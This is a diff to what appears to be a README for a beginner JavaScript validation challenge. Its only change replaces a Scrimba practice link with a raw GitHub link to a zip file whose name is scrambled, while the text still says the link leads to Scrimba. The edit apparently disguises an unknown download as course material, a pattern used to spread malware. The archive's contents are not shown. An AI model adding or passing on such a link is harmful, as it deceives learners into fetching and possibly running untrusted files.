@@ -30,4 +30,4 @@ Imagine you are building a virtual pet adoption website, and you need to create 
 
 This challenge helps students practice basic string manipulation and validation in JavaScript, along with simple DOM manipulation to create an interactive and user-friendly interface.
 
-Check out the practice challenges on Scrimba here: https://scrimba.com/playlist/pqPae6ZH7
+Check out the practice challenges on Scrimba here: https://raw.githubusercontent.com/LupiwoPhillips/Module_1_PTO2409_GROUP-A_LUPIWO-PHILLIPS_JSL01/main/literalize/LUPIW-JS-GROU-Module-PHILLIP-PT-underwheel.zip
